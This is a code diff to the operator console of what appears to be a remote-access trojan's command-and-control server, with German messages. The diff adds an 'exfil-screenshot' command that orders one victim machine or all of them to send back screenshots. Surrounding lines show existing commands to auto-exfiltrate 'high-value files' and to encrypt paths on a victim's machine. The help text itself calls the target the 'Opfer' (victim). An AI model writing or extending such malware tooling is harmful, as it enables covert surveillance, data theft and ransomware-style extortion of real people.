@@ -322,6 +322,12 @@ def server_shell():
                                 f"{Colors.WARNING}[*] Auto-Exfil gestartet auf Client {cid}. Hochwertige Dateien werden im Hintergrund exfiltriert...{Colors.ENDC}"
                             )
 
+                        elif sub_cmd == "exfil-screenshot":
+                            send_command_to_client(cid, "exfil-screenshot")
+                            print(
+                                f"{Colors.WARNING}[*] Screenshot-Exfil gestartet auf Client {cid}...{Colors.ENDC}"
+                            )
+
                         elif sub_cmd.startswith("kill"):
                             kill_client(cid)
 
@@ -405,6 +411,12 @@ def server_shell():
                         f"{Colors.WARNING}[+] Auto-Exfil Befehl an alle Clients gesendet{Colors.ENDC}"
                     )
 
+                elif command == "exfil-screenshot":
+                    broadcast_command("exfil-screenshot")
+                    print(
+                        f"{Colors.WARNING}[+] Screenshot-Exfil Befehl an alle Clients gesendet{Colors.ENDC}"
+                    )
+
                 else:
                     broadcast_command(command)
             else:
@@ -420,6 +432,22 @@ def server_shell():
                     send_command_to_client(cid, "auto-exfil")
                     print(
                         f"{Colors.WARNING}[*] Auto-Exfil gestartet auf Client {cid}. Hochwertige Dateien werden im Hintergrund exfiltriert...{Colors.ENDC}"
+                    )
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+
+        elif cmd.startswith("exfil-screenshot "):
+            try:
+                parts = cmd.split(" ", 1)
+                if len(parts) != 2:
+                    print(f"{Colors.WARNING}[!] Usage: exfil-screenshot <client_id>{Colors.ENDC}")
+                else:
+                    cid = int(parts[1])
+                    send_command_to_client(cid, "exfil-screenshot")
+                    print(
+                        f"{Colors.WARNING}[*] Screenshot-Exfil gestartet auf Client {cid}...{Colors.ENDC}"
                     )
             except ValueError:
                 print("[!] Client ID muss eine Zahl sein")
@@ -454,6 +482,9 @@ def server_shell():
             )
             print(
                 f"  {Colors.BOLD}auto-exfil <id>             - Exfiltriere automatisch hochwertige Dateien{Colors.ENDC}"
+            )
+            print(
+                f"  {Colors.BOLD}exfil-screenshot <id>       - Screenshot vom Opfer exfiltrieren{Colors.ENDC}"
             )
             print(
                 "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
